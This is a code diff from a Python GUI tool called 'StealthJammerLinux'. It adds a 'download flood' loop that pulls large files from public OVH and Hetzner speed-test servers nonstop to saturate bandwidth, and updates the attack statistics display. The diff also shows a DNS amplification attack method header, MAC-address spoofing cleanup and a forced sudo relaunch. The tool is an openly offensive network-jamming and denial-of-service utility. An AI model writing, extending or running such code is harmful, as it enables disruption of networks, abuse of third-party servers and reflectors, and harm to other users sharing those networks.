+            "http://proof.ovh.net/files/100Mb.dat",
+            "http://proof.ovh.net/files/10Mb.dat",
+            "http://ash-speed.hetzner.com/100MB.bin",
+            "http://fsn-speed.hetzner.com/100MB.bin",
+        ]
+        
+        chunk_size = 262144  # 256KB chunks for more efficient downloads
+        
+        while self.download_flood_active:
+            try:
+                # Randomly select a download URL
+                url = random.choice(download_urls)
+                
+                # Download without storing
+                with urllib.request.urlopen(url, timeout=10) as response:
+                    while self.download_flood_active:
+                        chunk = response.read(chunk_size)
+                        if not chunk:
+                            break
+                        # Immediately discard the data
+                        self.bytes_downloaded += len(chunk)
+                        # No delay for maximum bandwidth saturation
+            except Exception as e:
+                # If download fails, try again with different URL immediately
+                time.sleep(0.1)
     
     def dns_amplification_attack(self):
         """DNS amplification attack - reflects through DNS servers"""
@@ -2091,7 +2420,8 @@ class StealthJammerLinux(tk.Tk):
             self.rate_label.config(text=f"{self.current_pps:,} pps")
             self.bandwidth_label.config(text=f"{self.format_bytes(self.current_bandwidth)}/s")
             self.data_label.config(text=self.format_bytes(self.bytes_sent))
-            self.threads_label.config(text=f"{len(self.attack_threads)}")
+            self.download_data_label.config(text=self.format_bytes(self.bytes_downloaded))
+            self.threads_label.config(text=f"{len(self.attack_threads) + len(self.download_flood_threads)}")
         
         # Update ping
         if self.current_ping >= 0:
@@ -2106,26 +2436,49 @@ class StealthJammerLinux(tk.Tk):
         else:
             self.ping_label.config(text="Timeout", foreground=self.danger_color)
         
-        self.after(200, self.update_stats)
+        # Update download speed
+        if self.current_download_speed > 0:
+            speed_text = self.format_bytes(self.current_download_speed) + "/s"
+            if self.current_download_speed >= 10_000_000:  # >= 10 MB/s
+                self.download_label.config(text=speed_text, foreground=self.success_color)
+            elif self.current_download_speed >= 1_000_000:  # >= 1 MB/s
+                self.download_label.config(text=speed_text, foreground=self.warning_color)
+            else:
+                self.download_label.config(text=speed_text, foreground=self.danger_color)
+        else:
+            self.download_label.config(text="Measuring...", foreground=self.fg_color)
+        
+        self.frame.after(200, self.update_stats)
     
-    def on_destroy(self):
-        """Cleanup on exit"""
+    def cleanup(self):
+        """Cleanup this instance"""
         self.attack_active = False
         self.ping_monitoring = False
+        self.download_monitoring = False
+        self.download_flood_active = False
         
         # Restore original MAC if changed
-        if self.original_mac and self.current_mac != self.original_mac and self.current_interface and self.is_root:
+        if hasattr(self, 'original_mac') and self.original_mac and hasattr(self, 'current_mac') and self.current_mac != self.original_mac and hasattr(self, 'current_interface') and self.current_interface and self.is_root:
             try:
                 subprocess.run(['ip', 'link', 'set', self.current_interface, 'down'], timeout=5)
                 subprocess.run(['ip', 'link', 'set', self.current_interface, 'address', self.original_mac], timeout=5)
                 subprocess.run(['ip', 'link', 'set', self.current_interface, 'up'], timeout=5)
             except:
                 pass
-        
-        self.log_message("System shutdown initiated", "WARNING")
-        self.destroy()
 
 if __name__ == "__main__":
+    # Check if running as root, if not, re-launch with sudo
+    if os.geteuid() != 0:
+        print("[!] This application requires root privileges.")
+        print("[*] Relaunching with sudo...")
+        try:
+            # Re-launch the script with sudo
+            args = ['sudo', sys.executable] + sys.argv
+            os.execvp('sudo', args)
+        except Exception as e:
+            print(f"[ERROR] Failed to launch with sudo: {e}")
+            sys.exit(1)
+    
     # Show warning on startup
     root = tk.Tk()
     root.withdraw()
